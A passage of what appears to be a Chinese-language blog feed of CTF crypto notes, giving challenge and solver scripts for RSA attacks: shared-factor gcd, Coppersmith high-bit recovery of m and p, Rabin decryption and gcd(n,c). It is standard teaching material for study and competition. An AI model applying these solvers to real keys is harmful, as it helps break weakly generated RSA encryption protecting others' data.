number">26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659</span>c20 <span class="token operator">=</span> <span class="token number">386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346</span>e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    n<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'n'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    c<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'c'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> n<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>  <span class="token comment"># i=4,j=17</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> n<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n5<span class="token punctuation">,</span> n18<span class="token punctuation">)</span>q <span class="token operator">=</span> n5 <span class="token operator">//</span> pd <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c5<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n5<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>m高位攻击</title>
      <link href="/2023/01/14/m%E9%AB%98%E4%BD%8D%E6%94%BB%E5%87%BB/"/>
      <url>/2023/01/14/m%E9%AB%98%E4%BD%8D%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="sage脚本-m高位攻击"><a href="#sage脚本-m高位攻击" class="headerlink" title="sage脚本_m高位攻击"></a>sage脚本_m高位攻击</h2><pre class="line-numbers language-none"><code class="language-none">sage下载地址：https:&#x2F;&#x2F;www.sagemath.org&#x2F;download-windows.htmlsage在线计算：https:&#x2F;&#x2F;sagecell.sagemath.org&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="出题脚本"><a href="#出题脚本" class="headerlink" title="出题脚本"></a>出题脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> uuid<span class="token comment">#m文高位攻击出题脚本</span>flag<span class="token operator">=</span><span class="token string">"flag&#123;"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&#125;"</span>m<span class="token operator">=</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>p<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>n<span class="token operator">=</span>p<span class="token operator">*</span>qe<span class="token operator">=</span><span class="token number">3</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>m1<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">>></span><span class="token number">60</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n="</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e="</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c="</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"((m>>60)&lt;&lt;60)="</span><span class="token punctuation">,</span>m1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">def</span> <span class="token function">phase2</span><span class="token punctuation">(</span>high_m<span class="token punctuation">,</span> n<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    R<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span> implementation<span class="token operator">=</span><span class="token string">'NTL'</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> high_m <span class="token operator">+</span> x    M <span class="token operator">=</span> m<span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">^</span><span class="token number">3</span> <span class="token operator">-</span> c<span class="token punctuation">)</span><span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n<span class="token operator">=</span> <span class="token number">16375911057984467860173028499662793813198989070891462046702689271326139635781678292779095962528585009670015786235494254339716198163498114440710970519760731615457538963588012609421435357625310123852269659556877780556282784378911243624799312161395869291700339099744622787092292212808041739935363726641015733082591519285930439717736591210957039387077203590963514630879038078615201950805057733038622070074246926048776699133348654093003217709061073510046710565744672093957004519016895478465918909294337641778357708633353664132944153092793959582685432330892190960961439661225639169934805918097911051922729785720701933534021</span>e<span class="token operator">=</span> <span class="token number">3</span>c<span class="token operator">=</span> <span class="token number">175676150266403934024028881165956357569100114594293998449367661494592439256350774016927790942005197030835672661768700955232102741828268826317608643103085037913845664530507219457425306700667637263739558920826441431873842792152100711788904901597274447160613809337879563457097769364821425046114008763402341</span>high_m<span class="token operator">=</span> <span class="token number">56006392793404656900162277604003911130977996870658599363889243117614813715239971694356275604343488512</span>phase2<span class="token punctuation">(</span>high_m<span class="token punctuation">,</span> n<span class="token punctuation">,</span> c<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>p高位攻击</title>
      <link href="/2023/01/14/p%E9%AB%98%E4%BD%8D%E6%94%BB%E5%87%BB/"/>
      <url>/2023/01/14/p%E9%AB%98%E4%BD%8D%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h3 id="脚本1"><a href="#脚本1" class="headerlink" title="脚本1"></a>脚本1</h3><p>根据题目，注意 2^60  60需要修改相应的位数  a &#x3D; (p &gt;&gt; 60) &lt;&lt; 60 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">phase3</span><span class="token punctuation">(</span>high_p<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    R<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span> implementation<span class="token operator">=</span><span class="token string">'NTL'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> high_p <span class="token operator">+</span> x    x0 <span class="token operator">=</span> p<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">^</span><span class="token number">60</span><span class="token punctuation">,</span> beta <span class="token operator">=</span> <span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    P <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">(</span>x0<span class="token punctuation">)</span><span class="token punctuation">)</span>    Q <span class="token operator">=</span> n <span class="token operator">//</span> P    <span class="token keyword">print</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span>    <span class="token keyword">assert</span> n <span class="token operator">==</span> P<span class="token operator">*</span>Qn<span class="token operator">=</span><span class="token number">0x558477ce1d081f831cfa159290ee4fd14888422c216a16ad86e2b2d4335e3cb18ed0120a955f970b17b229a8e7d0ae1b6f0c40213ad0e127eba99ae0d8a82397</span>p4<span class="token operator">=</span><span class="token number">0x8fbcbb7d1e9f393ee21b537d6e0bd2cf8629e315f4e356c1e000000000000000</span>e<span class="token operator">=</span><span class="token number">0xf7278179324b11fd83d08aa6f</span>c<span class="token operator">=</span><span class="token number">0x36e1c09ccad45cd63a0f07e704d3811c39d70cdfdad999d2df90255a76c58cf6fe99ac1ab1d5d99a4ce1a2ebdbfbc49ce72df2a0b90766ff84ab0ef62068d46b</span>phase3<span class="token punctuation">(</span>p4<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="脚本2"><a href="#脚本2" class="headerlink" title="脚本2"></a>脚本2</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> <span class="token number">22127806011633861727954101002390179580447625543207045612671617864341845851658260004006826435219665722338399712799144283442305160095371386129132285556214330279867129279885732638085139970894386809975772641941102438472230541606849251235636928502018782288977994793382547376630461074356449893196487276906629063423071245785206275636191377977712166746567658967286739276282635616277590864547265366547379387583014365390660407286148179073747800137068237371705680826025177248889969809158386539617738762070772471531610084135064141878988874470291949704156926711239213996266350299670204058121040684469621186909795304289942430452869</span>p4<span class="token operator">=</span><span class="token number">0xd8bf1376aaae63b3c4d693ca7f3d8a76270b7310bb8bd4608a98c9fdd85fc1ccc7c246b364e2779034057f0ec7a101bad64269d9dcca69f9b5c3462b058b94db0987aa09426c5e7634b3e19f56872693206790c6feef0c9ae662d73f1b12c3cd</span>e <span class="token operator">=</span> <span class="token number">0x10001</span>pbits <span class="token operator">=</span> <span class="token number">1024</span>kbits <span class="token operator">=</span> pbits <span class="token operator">-</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p4 <span class="token operator">=</span> p4 <span class="token operator">&lt;&lt;</span> kbitsPR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> x <span class="token operator">+</span> p4roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span><span class="token keyword">if</span> roots<span class="token punctuation">:</span>    p <span class="token operator">=</span> p4<span class="token operator">+</span><span class="token builtin">int</span><span class="token punctuation">(</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"n: "</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"p: "</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"q: "</span><span class="token punctuation">,</span> n<span class="token operator">/</span>p<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rabin解密</title>
      <link href="/2023/01/14/rabin%E8%A7%A3%E5%AF%86/"/>
      <url>/2023/01/14/rabin%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h3 id="出题脚本"><a href="#出题脚本" class="headerlink" title="出题脚本"></a>出题脚本</h3><pre class="line-numbers language-none"><code class="language-none">密文flagZNpjDckEhgOPDHBmMhKYQ+tMzVV&#x2F;EMe4W+oLoWKWqvQ公钥pubkey.pem-----BEGIN PUBLIC KEY-----MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ&#x2F;+5erCQKPGqxsC&#x2F;bNPXDryigb&#x2F;+l&#x2F;vjDdAgEC-----END PUBLIC KEY----- <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2<span class="token comment">#导入公钥</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"pubkey.pem"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    n <span class="token operator">=</span>key<span class="token punctuation">.</span>n    e <span class="token operator">=</span>key<span class="token punctuation">.</span>e<span class="token comment">#导入密文</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    c<span class="token operator">=</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token comment">#n 在线分解</span>p<span class="token operator">=</span><span class="token number">275127860351348928173285174381581152299</span>q<span class="token operator">=</span><span class="token number">319576316814478949870590164193048041239</span>inv_p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span>inv_q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>q<span class="token punctuation">,</span> p<span class="token punctuation">)</span>mp <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">4</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>mq <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token punctuation">(</span>q <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">4</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token punctuation">(</span>inv_p <span class="token operator">*</span> p <span class="token operator">*</span> mq <span class="token operator">+</span> inv_q <span class="token operator">*</span> q <span class="token operator">*</span> mp<span class="token punctuation">)</span> <span class="token operator">%</span> nb <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token punctuation">(</span>inv_p <span class="token operator">*</span> p <span class="token operator">*</span> mq <span class="token operator">-</span> inv_q <span class="token operator">*</span> q <span class="token operator">*</span> mp<span class="token punctuation">)</span> <span class="token operator">%</span> nd <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token comment">#因为rabin 加密有四种结果，全部列出。</span>aa<span class="token operator">=</span><span class="token punctuation">[</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> aa<span class="token punctuation">:</span>    <span class="token comment"># print(i)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA(NC不互素)</title>
      <link href="/2023/01/14/RSA-NC%E4%B8%8D%E4%BA%92%E7%B4%A0/"/>
      <url>/2023/01/14/RSA-NC%E4%B8%8D%E4%BA%92%E7%B4%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="出题脚本"><a href="#出题脚本" class="headerlink" title="出题脚本"></a>出题脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> flag <span class="token keyword">import</span> flag<span class="token keyword">assert</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">b'flag&#123;'</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> q<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n ='</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">0x10001</span>M <span class="token operator">=</span> <span class="token number">2021</span> <span class="token operator">*</span> m <span class="token operator">*</span> <span class="token number">1001</span> <span class="token operator">*</span> pc <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>M<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c ='</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token comment">#n = 17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847</span><span class="token comment">#c = 6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnumn <span class="token operator">=</span> <span class="token number">17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847</span>c <span class="token operator">=</span> <span class="token number">6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676</span>e <span class="token operator">=</span> <span class="token number">0x10001</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n<span class="token punctuation">,</span> c<span class="token punctuation">)</span>q <span class="token operator">=</span> n <span class="token operator">//</span> p<span class="token keyword">assert</span> n <span class="token operator">==</span> p <span class="token operator">*</span> qphi_n<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span>M<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token comment">#M= 2021 * 1001 * p*m</span>m<span class="token operator">=</span>M<span class="token operator">//</span><span class="token punctuation">(</span><span class="token number">2021</span> <span class="token operator">*</span> <span class="token number">1001</span> <span class="token operator">*</span> p<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>e和phi_n不互素</title>
      <link href="/2023/01/14/e%E5%92%8Cphi-n%E4%B8%8D%E4%BA%92%E7%B4%A0/"/>
      <url>/2023/01/14/e%E5%92%8Cphi-n%E4%B8%8D%E4%BA%92%E7%B4%A0/</url>
      
        <content type="html"><![CDATA[<p>e和phi_n不互素是指它俩的公约数不为1</p><pre class="line-numbers language-none"><code class="language-none">令t &#x3D; gmpy2.gcd(e,phi)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-m-t-lt-n"><a href="#1-m-t-lt-n" class="headerlink" title="1.m**t &lt; n"></a>1.m**t &lt; n</h3><h4 id="出题脚本"><a href="#出题脚本" class="headerlink" title="出题脚本"></a>出题脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token keyword">import</span> random<span class="token keyword">import</span> uuidflag<span class="token operator">=</span><span class="token string">"flag&#123;"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&#125;"</span>m<span class="token operator">=</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    e <span class="token operator">=</span> 